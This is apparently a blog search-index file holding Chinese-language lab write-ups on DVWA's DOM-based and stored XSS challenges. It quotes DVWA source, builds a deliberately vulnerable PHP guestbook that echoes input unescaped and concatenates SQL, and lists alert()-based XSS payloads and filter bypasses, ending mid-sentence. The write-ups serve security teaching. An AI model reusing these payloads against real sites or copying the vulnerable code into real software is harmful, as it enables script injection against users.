<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>XSS(DOM)</title>
      <link href="/2022/01/23/CTF/Web/dvwa/XSS(DOM)/"/>
      <url>/2022/01/23/CTF/Web/dvwa/XSS(DOM)/</url>
      
        <content type="html"><![CDATA[<h1 id="XSS-DOM"><a href="#XSS-DOM" class="headerlink" title="XSS(DOM )"></a>XSS(DOM )</h1><h2 id="xss（dom）介绍"><a href="#xss（dom）介绍" class="headerlink" title="xss（dom）介绍"></a>xss（dom）介绍</h2><p>通过修改页面的 DOM 节点形成的XSS，称之为 DOM XSS。</p><p>它和反射型 XSS、存储型XSS的差别在于，DOM XSS 的 XSS 代码<strong>并不需要服务器解析响应的直接参与，触发XSS靠的就是浏览器端的 DOM 解析，可以认为完全是客户端的事情。</strong></p><p>下面编写一个简单的含有 DOM XSS漏洞的 HTML 代码：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">xss</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> str = <span class="built_in">document</span>.getElementById(<span class="string">&quot;src&quot;</span>).value;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.getElementById(<span class="string">&quot;demo&quot;</span>).innerHTML = <span class="string">&quot;&lt;img src=&#x27;&quot;</span>+str+<span class="string">&quot;&#x27; /&gt;&quot;</span>;</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;src&quot;</span> <span class="attr">size</span>=<span class="string">&quot;50&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;输入图片地址&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;插入&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;xss()&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;demo&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>功能很简单，用户输入框插入图片地址后，页面会将图片插入在<code>id=&quot;demo&quot;</code> 的 div 标签中，从而显示在网页上：</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/15785783167395.png" alt="img"></p><p>同样，这里也没有对用户的输入进入过滤，当攻击者构造如下语句插入的时候：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; onerror=alert(233)</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/15785783167395.png" alt="img"></p><p>会直接在<code>img</code>标签中插入<code>onerror</code>事件，该语句表示当图片加载出错的时候，自动触发后面的 alert()函数，来达到弹窗的效果，这就是一个最简单的 DOM 型 XSS 漏洞。</p><h1 id="DVWA-xss（dom）"><a href="#DVWA-xss（dom）" class="headerlink" title="DVWA-xss（dom）"></a>DVWA-xss（dom）</h1><h2 id="low"><a href="#low" class="headerlink" title="low"></a>low</h2><h3 id="查看源码"><a href="#查看源码" class="headerlink" title="查看源码"></a>查看源码</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;vulnerable_code_area&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">         <span class="tag">&lt;<span class="name">p</span>&gt;</span>Please choose a language:<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">&quot;XSS&quot;</span> <span class="attr">method</span>=<span class="string">&quot;GET&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">&quot;default&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">                    <span class="keyword">if</span> (<span class="built_in">document</span>.location.href.indexOf(<span class="string">&quot;default=&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="javascript">                        <span class="keyword">var</span> lang = <span class="built_in">document</span>.location.href.substring(<span class="built_in">document</span>.location.href.indexOf(<span class="string">&quot;default=&quot;</span>)+<span class="number">8</span>);</span></span><br><span class="line"><span class="javascript">                        <span class="built_in">document</span>.write(<span class="string">&quot;&lt;option value=&#x27;&quot;</span> + lang + <span class="string">&quot;&#x27;&gt;&quot;</span> + $decodeURI(lang) + <span class="string">&quot;&lt;/option&gt;&quot;</span>);</span></span><br><span class="line"><span class="javascript">                        <span class="built_in">document</span>.write(<span class="string">&quot;&lt;option value=&#x27;&#x27; disabled=&#x27;disabled&#x27;&gt;----&lt;/option&gt;&quot;</span>);</span></span><br><span class="line"><span class="javascript">                    &#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">                    <span class="built_in">document</span>.write(<span class="string">&quot;&lt;option value=&#x27;English&#x27;&gt;English&lt;/option&gt;&quot;</span>);</span></span><br><span class="line"><span class="javascript">                    <span class="built_in">document</span>.write(<span class="string">&quot;&lt;option value=&#x27;French&#x27;&gt;French&lt;/option&gt;&quot;</span>);</span></span><br><span class="line"><span class="javascript">                    <span class="built_in">document</span>.write(<span class="string">&quot;&lt;option value=&#x27;Spanish&#x27;&gt;Spanish&lt;/option&gt;&quot;</span>);</span></span><br><span class="line"><span class="javascript">                    <span class="built_in">document</span>.write(<span class="string">&quot;&lt;option value=&#x27;German&#x27;&gt;German&lt;/option&gt;&quot;</span>);</span></span><br><span class="line"><span class="javascript">                </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Select&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>DOM XSS 是通过修改页面的 DOM 节点形成的 XSS。首先通过选择语言后然后往页面中创建了新的 DOM 节点：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">document.write(&quot;<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&#x27;&quot; + lang + &quot;&#x27;</span>&gt;</span>&quot; + $decodeURI(lang) + &quot;<span class="tag">&lt;/<span class="name">option</span>&gt;</span>&quot;);</span><br><span class="line">document.write(&quot;<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&#x27;&#x27;</span> <span class="attr">disabled</span>=<span class="string">&#x27;disabled&#x27;</span>&gt;</span>----<span class="tag">&lt;/<span class="name">option</span>&gt;</span>&quot;);</span><br></pre></td></tr></table></figure><p>这里的<code>lang</code>变量通过<code>document.location.href</code>来获取到，并且没有任何过滤就直接 URL 解码后输出在了<code>option</code>标签中，以下 payload 在<code>Firefox Developer Edition 56.0b9</code>版本的浏览器测试成功</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p><strong>payload</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">?<span class="keyword">default</span>=English &lt;script&gt;alert(<span class="string">&#x27;XSS&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h2><h3 id="查看源码-1"><a href="#查看源码-1" class="headerlink" title="查看源码"></a>查看源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span> ( array_key_exists( <span class="string">&quot;default&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; !is_null (<span class="variable">$_GET</span>[ <span class="string">&#x27;default&#x27;</span> ]) ) &#123;</span><br><span class="line">    <span class="variable">$default</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;default&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Do not allow script tags</span></span><br><span class="line">    <span class="keyword">if</span> (stripos (<span class="variable">$default</span>, <span class="string">&quot;&lt;script&quot;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">        header (<span class="string">&quot;location: ?default=English&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>对<code>default</code>变量进行了过滤，通过<code>stripos()</code> 函数查找<code>&lt;script</code>字符串在<code>default</code>变量值中第一次出现的位置（不区分大小写），如果匹配搭配的话手动通过<code>location</code>将URL后面的参数修正为<code>?default=English</code>，同样这里可以通过其他的标签搭配事件来达到弹窗的效果。</p><p>闭合<code>&lt;/option&gt;</code>和<code>&lt;/select&gt;</code>，然后使用<code>img</code>标签通过事件来弹窗</p><p><strong>payload1</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">?<span class="keyword">default</span>=English&lt;<span class="regexp">/option&gt;&lt;/</span>select&gt;<span class="xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span></span><br></pre></td></tr></table></figure><p>直接利用<code>input</code>的事件来弹窗</p><p><strong>payload2</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">?<span class="keyword">default</span>=English&lt;input onclick=alert(<span class="string">&#x27;XSS&#x27;</span>) /&gt;</span><br></pre></td></tr></table></figure><h2 id="high"><a href="#high" class="headerlink" title="high"></a>high</h2><h3 id="查看源码-2"><a href="#查看源码-2" class="headerlink" title="查看源码"></a><strong>查看源码</strong></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span> ( array_key_exists( <span class="string">&quot;default&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; !is_null (<span class="variable">$_GET</span>[ <span class="string">&#x27;default&#x27;</span> ]) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># White list the allowable languages</span></span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;default&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;French&quot;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;English&quot;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;German&quot;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;Spanish&quot;</span>:</span><br><span class="line">            <span class="comment"># ok</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            header (<span class="string">&quot;location: ?default=English&quot;</span>);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>使用了白名单模式，如果<code>default</code>的值不为 French、English、German、Spanish 的话就重置 URL 为:<code>?default=English</code> ，这里只是对 default 的变量进行了过滤。</p><h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>可以使用<code>&amp;</code>连接另一个自定义变量来Bypass</p><p><strong>payload1</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">?<span class="keyword">default</span>=English&amp;a=&lt;<span class="regexp">/option&gt;&lt;/</span>select&gt;<span class="xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span></span><br><span class="line"><span class="xml">?default=English&amp;a=<span class="tag">&lt;<span class="name">input</span> <span class="attr">onclick</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;) /&gt;</span></span></span><br></pre></td></tr></table></figure><p>也可以使用<code>#</code>来 Bypass</p><p><strong>payload2</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">?<span class="keyword">default</span>=English#&lt;<span class="regexp">/option&gt;&lt;/</span>select&gt;<span class="xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span></span><br><span class="line"><span class="xml">?default=English#<span class="tag">&lt;<span class="name">input</span> <span class="attr">onclick</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;) /&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><h3 id="查看源码-3"><a href="#查看源码-3" class="headerlink" title="查看源码"></a><strong>查看源码</strong></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># For the impossible level, don&#x27;t decode the querystring</span></span><br><span class="line"><span class="variable">$decodeURI</span> = <span class="string">&quot;decodeURI&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$vulnerabilityFile</span> == <span class="string">&#x27;impossible.php&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$decodeURI</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Impossible</code> 级别直接不对我们的输入参数进行 URL 解码了，这样会导致标签失效，从而无法XSS</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p>文章作者: 国光<br>文章链接: <a href="https://www.sqlsec.com/2020/01/xss.html#toc-heading-25">https://www.sqlsec.com/2020/01/xss.html#toc-heading-25</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> xss </tag>
            
            <tag> dvwa </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>存储型XSS(XSS（stored）)</title>
      <link href="/2022/01/23/CTF/Web/dvwa/%E5%AD%98%E5%82%A8%E5%9E%8BXSS(XSS%EF%BC%88stored%EF%BC%89)/"/>
      <url>/2022/01/23/CTF/Web/dvwa/%E5%AD%98%E5%82%A8%E5%9E%8BXSS(XSS%EF%BC%88stored%EF%BC%89)/</url>
      
        <content type="html"><![CDATA[<h1 id="存储型XSS-XSS（stored）"><a href="#存储型XSS-XSS（stored）" class="headerlink" title="存储型XSS(XSS（stored）)"></a>存储型XSS(XSS（stored）)</h1><h1 id="存储型XSS介绍"><a href="#存储型XSS介绍" class="headerlink" title="存储型XSS介绍"></a>存储型XSS介绍</h1><p>存储型 XSS 和反射型 XSS 的差别仅在于：提交的 XSS 代码会存储在服务端（不管是数据库、内存还是文件系统等），下次请求目标页面时不用再提交 XSS 代码。最典型的例子是留言板 XSS。</p><p>为了复现存储型 XSS，这里我们得用到数据库，本地新建一个名字叫做<code>xss</code>的数据库，里面新建一个<code>message</code>表，用来存放用户的留言信息，字段名分别是<code>id</code>、<code>username</code>、<code>message</code></p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220123102206928.png" alt="image-20220123102206928"></p><p><code>id</code>设为主键，并勾选<strong>自动递增</strong> ，也可以参考下面的<code>sql</code>语句来设计表：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SET NAMES utf8mb4;</span><br><span class="line">SET FOREIGN_KEY_CHECKS = 0</span><br><span class="line"></span><br><span class="line">DROP TABLE IF EXISTS `message`;</span><br><span class="line">CREATE TABLE `message`  (</span><br><span class="line">  `id` int(11) NOT NULL AUTO_INCREMENT,</span><br><span class="line">  `username` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,</span><br><span class="line">  `message` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,</span><br><span class="line">  PRIMARY KEY (`id`) USING BTREE</span><br><span class="line">) ENGINE = MyISAM AUTO_INCREMENT = 17 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;</span><br><span class="line"></span><br><span class="line">SET FOREIGN_KEY_CHECKS = 1;</span><br></pre></td></tr></table></figure><p>目前数据库方面设计完了，开始着手写<code>PHP</code>后端页面，来复现一下存储型 XSS 漏洞：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*数据库信息配置*/</span></span><br><span class="line"><span class="variable">$host</span> = <span class="string">&quot;localhost&quot;</span>; <span class="comment">//数据库地址</span></span><br><span class="line"><span class="variable">$port</span> = <span class="string">&quot;3306&quot;</span>; <span class="comment">//数据库端口</span></span><br><span class="line"><span class="variable">$user</span> = <span class="string">&quot;root&quot;</span>; <span class="comment">//数据库用户名</span></span><br><span class="line"><span class="variable">$pwd</span> = <span class="string">&quot;root&quot;</span>; <span class="comment">//数据库密码</span></span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;xss&quot;</span>; <span class="comment">//数据库名</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> mysqli(<span class="variable">$host</span>,<span class="variable">$user</span>,<span class="variable">$pwd</span>,<span class="variable">$dbname</span>,<span class="variable">$port</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!-- 前端用户输入表单 --&gt;</span><br><span class="line">&lt;h1&gt;留言板的存储型XSS&lt;/h1&gt;</span><br><span class="line">&lt;form  method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span> placeholder=<span class="string">&quot;姓名&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;message&quot;</span> placeholder=<span class="string">&quot;请输入您的留言&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">/*直接将留言插入到数据库中*/</span></span><br><span class="line">    <span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$message</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;message&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$username</span> <span class="keyword">and</span> <span class="variable">$message</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$sql</span>=<span class="string">&quot;INSERT INTO `message`(`username`, `message`) VALUES (&#x27;<span class="subst">&#123;$username&#125;</span>&#x27;,&#x27;<span class="subst">&#123;$message&#125;</span>&#x27;)&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;query(<span class="variable">$sql</span>) === <span class="literal">TRUE</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;留言成功&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Error: &quot;</span> . <span class="variable">$sql</span> . <span class="string">&quot;&lt;br&gt;&quot;</span> . <span class="variable">$conn</span>-&gt;error;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;请填写完整信息&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*查询数据库中的留言信息*/</span></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT username, message FROM message&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;fetch_assoc()) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;用户名：&quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;username&quot;</span>]. <span class="string">&quot;留言内容:&quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;message&quot;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;暂无留言&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将以上代码保存为<code>php</code>文件，配置好数据库连接信息，通过http服务去访问，可以得到如下界面：</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220123102621664.png" alt="image-20220123102621664"></p><p>可以从代码看出，逻辑很简单，用户前端留言，就可以看到自己的留言信息了，代码中没有任何过滤，直接将用户的输入的语句插入到了<code>html</code>网页中，这样就很容易导致存储型<code>XSS</code>漏洞的产生。</p><p>当攻击者直接在留言板块插入<code>alert(&#39;鸡你太美&#39;)</code>，会导致这条恶意的语句直接插入到了数据库中，然后通过网页解析，成功触发了 JS 语句，导致用户浏览这个网页就会一直弹窗，除非从数据库中删除这条语句：</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220123103041259.png" alt="image-20220123103041259"></p><p>此时查看下网页源码：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span>用户名：<span class="tag">&lt;/<span class="name">b</span>&gt;</span>蔡徐坤   <span class="tag">&lt;<span class="name">b</span>&gt;</span>留言内容:<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&#x27;鸡你太美&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br></pre></td></tr></table></figure><p>存储型 XSS 的攻击是最隐蔽的也是危害比较大的，普通用户所看的 URL 为<code>http://127.0.0.1/test.php</code>，从 URL 上看均是正常的，但是当目标用户查看留言板时，那些留言的内容会从数据库查询出来并显示，浏览器发现有 XSS 代码，就当做正常的HTML与 JS 解析执行，于是就触发了 XSS 攻击。</p><h1 id="DVWA-存储型XSS"><a href="#DVWA-存储型XSS" class="headerlink" title="DVWA-存储型XSS"></a>DVWA-存储型XSS</h1><h2 id="low"><a href="#low" class="headerlink" title="low"></a>low</h2><h3 id="查看源码"><a href="#查看源码" class="headerlink" title="查看源码"></a>查看源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$message</span> = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    <span class="variable">$name</span>    = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    <span class="variable">$message</span> = stripslashes( <span class="variable">$message</span> );</span><br><span class="line">    <span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    <span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p><strong>payload</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Name: sqlsec</span><br><span class="line"><span class="attr">Message</span>: <span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>可以看到我们的 payload 直接插入到了数据库中了：</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220123103841414.png" alt="image-20220123103841414"></p><p>测试完成的话为了不影响下面题目的测试，这里建议手动从数据库中删除下这条记录。</p><h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><h4 id="trim"><a href="#trim" class="headerlink" title="trim"></a>trim</h4><p><strong>语法</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">trim(<span class="keyword">string</span>,charlist)</span><br></pre></td></tr></table></figure><p><strong>细节</strong></p><p>移除 string 字符两侧的预定义字符。</p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>string</td><td>必需。规定要检查的字符串。</td></tr><tr><td>charlist</td><td>可选。规定从字符串中删除哪些字符</td></tr></tbody></table><p><code>charlist</code>如果被省略，则移除以下所有字符：</p><table><thead><tr><th>符合</th><th>解释</th></tr></thead><tbody><tr><td>\0</td><td>NULL</td></tr><tr><td>\t</td><td>制表符</td></tr><tr><td>\n</td><td>换行</td></tr><tr><td>\x0B</td><td>垂直制表符</td></tr><tr><td>\r</td><td>回车</td></tr><tr><td></td><td>空格</td></tr></tbody></table><h4 id="stripslashes"><a href="#stripslashes" class="headerlink" title="stripslashes"></a>stripslashes</h4><p><strong>语法</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">stripslashes(<span class="keyword">string</span>)</span><br></pre></td></tr></table></figure><p><strong>细节</strong></p><p>去除掉 string 字符的反斜杠<code>\</code>，该函数可用于清理从数据库中或者从 HTML 表单中取回的数据。</p><h4 id="mysql-real-escape-string"><a href="#mysql-real-escape-string" class="headerlink" title="mysql_real_escape_string"></a>mysql_real_escape_string</h4><p><strong>语法</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">mysql_real_escape_string(<span class="keyword">string</span>,connection)</span><br></pre></td></tr></table></figure><p><strong>细节</strong></p><p>转义 SQL 